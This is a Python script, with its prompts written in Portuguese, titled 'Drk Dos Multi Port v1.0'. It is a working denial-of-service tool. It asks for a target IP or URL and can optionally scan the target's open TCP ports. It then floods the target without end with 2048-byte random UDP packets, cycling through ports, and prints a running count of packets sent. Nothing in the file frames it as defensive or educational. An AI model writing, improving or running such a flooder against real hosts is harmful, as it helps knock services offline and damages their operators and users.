from datetime import datetime;
import os, sys, time;
import socket, random; 
import threading;

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
bytes = random._urandom(2048);
nports = 0;
rport = 0;

def attack():
    sock.sendto(bytes, (ip,port));

def verifyports():
    scaneds = 0;
    for porta in range(nports):
        port = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
        port.settimeout(0.1);
        opened = port.connect_ex((ip, porta));
        if opened == 0:
            scaneds += 1;
            print(porta, "OPEN");
    
    print('');
    print('PORTAS ESCANEADAS: {} PORTAS ABERTAS: {}'.format(nports,scaneds));
    print('');

def banner(): 
    print('__Drk__ Dos Multi Port v1.0 |By: __TheFox__ |');
    print('');
    print('! No primeiro campo insira o ip ou url do alvo !');
    print('! no segundo insira a porta que deseja atacar !');
    print('! ou defina o valor como 0 para atacar portas aleatorias !');
    print('');

banner();

ip = input('[__drk__] Alvo: ');

print('');
scanyn = input('[__drk__] Voce deseja escanear as portas abertas [Y]es ou [N]o: ');

if scanyn == "y" or scanyn == "Y":
    nports = int(input('[__drk__] Numero de portas que voce deseja ecanear: '));
    print('');
    verifyports();

try:
  port = int(input('[__drk__] Porta ou [0]random: '));

except:
  print("! Porta invalida !");
  port = int(input('[__drk__] Porta ou [0]random: '));

if port == 0:
    rport = 1;
    port = 1;

enviados = 1;

while True:
    
    now = datetime.now();
    hour = now.hour;
    minute = now.minute;
    second = now.second;

    threading.Thread(target=attack()).start();
    enviados += 1;
    if rport == 1:
        port += 1;

    if port == 65534:
        port = 1;
    
    
    print('[__drk__ {}:{}:{}] Pacotes enviados: {} Porta: {}'.format(hour,minute,second,enviados,port));
